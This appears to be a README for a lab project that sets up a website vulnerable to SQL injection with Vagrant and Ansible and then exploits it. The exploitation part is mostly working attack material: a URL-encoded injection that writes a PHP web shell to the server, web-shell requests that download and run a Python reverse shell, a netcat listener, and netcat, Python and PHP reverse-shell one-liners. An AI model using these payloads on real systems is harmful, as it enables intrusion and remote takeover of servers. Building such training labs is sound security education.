SQL INJECTION ATTACK EXAMPLE
============================

This small project is a working example of setting up a website vulnerable to SQL injection with instructions
on how to exploit it to get shell access.

Setup Instructions
----------------------------

In order to setup locally, you will need Virtualbox, Vagrant and Ansible installed on your work machine.

```
// Clone the repository to your work machine.
# git clone git@github.com:doublehops/sql-injection-attack-example.git

// Change into the new directory download and run the virtual machine with:
# vagrant up

// Ensure you can ssh into the virtual machine:
# ssh vagrant@192.168.30.99 -i .vagrant/machines/default/virtualbox/private_key

// Use Ansible to provision (install the webserver, PHP, MariaDB/MYSQL) the box with the following:
# dev/provision.sh local_dev

// Import database schema and data into database:
# dev/ssh-import-database.sh

// Load the webpage in your browser to check all is well: http://192.168.30.99
```

Play Around with SQL Injection
------------------------------




Gain Access to Webserver with SQL Injection
-------------------------------------------

Create a PHP script that will run commands
http://secure.api/sql-injection/outfile.php?username=d%27;select%20%22%3C?php%20system($_GET[%27cmd%27]);%22%20into%20outfile%20%22/var/www/web/images/cmd.php%22;

PYTHON BACKDOOR

Download Python reverse shell
http://secure.api/images/cmd.php?cmd=wget%20http://secure.api/scripts/reverse-shell.py -O /tmp/reverse-shell.py

Run new Python backdoor script
http://secure.api/images/cmd.php?cmd=/tmp/reverse-shell.py




NOTES
----------

Setup host machine for incoming connections:
`nc -nvlp 4444`

Run reverse shell command on foreign machine:

Netcat reverse shell
`nc.traditional -e /bin/sh <host> 4444`

Python reverse shell
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

PHP reverse shell
`php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'`
